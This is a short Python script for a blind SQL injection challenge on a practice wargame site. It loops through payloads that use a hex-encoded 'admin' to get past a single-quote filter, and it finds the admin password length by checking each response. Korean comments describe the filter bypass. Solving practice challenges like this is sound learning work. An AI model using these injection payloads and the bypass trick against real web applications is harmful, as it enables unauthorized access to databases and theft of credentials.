import urllib3
import requests

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw="
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

length = 0

for i in range(0,25):
    query = "1&no=0 or id like 0x61646d696e and length(pw) like {}%23".format(i)
    req = requests.get(url+query, headers=header)
    print(url+query)
    print("[+] send req length is {}".format(i))
    if "Hello admin" in req.text:
        length = i
        break

print(length)

# 싱글쿼터(')를 못쓴다고 해서 %27admin%27해봤지만 안먹힌다.
# 싱글쿼터(')를 못쓰면 문자열을 반환하여 사용해야 한다.
# https://www.dongyeon1201.kr/ef1852a7-c8dd-4c84-9d0f-ef4a81476960
# 위 주소의 힌트 이용
